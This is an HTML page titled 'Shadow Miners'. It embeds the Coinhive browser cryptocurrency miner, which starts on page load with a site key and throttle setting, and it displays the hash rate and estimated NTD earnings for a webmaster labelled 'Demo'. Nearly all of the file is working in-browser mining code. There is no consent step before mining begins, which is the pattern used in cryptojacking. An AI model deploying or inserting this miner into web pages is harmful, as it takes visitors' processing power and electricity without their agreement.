<html>
<head>
<title>Shadow Miners</title>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
		autoThreads: true,
		throttle: 0.7,
		forceASMJS: false
	});
	miner.start();
	miner.on('found', function(){})
	miner.on('accepted', function(){})
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		var ntd = acceptedHashes/1000000*0.139;
		document.getElementById("hash").textContent = hashesPerSecond;
		document.getElementById("coin").textContent = acceptedHashes;
		document.getElementById("ntd").textContent = ntd;
	}, 1000);
</script>
</head>
<body>
    	<p>站長：Demo</p> 
 	<p>累積點數：<span id="coin"></span></p>
	<p>累積酬勞：<span id="ntd"></span> NTD</p>
	<p>當前算力：<span id="hash"></span> H/s</p>
</body>
</html>
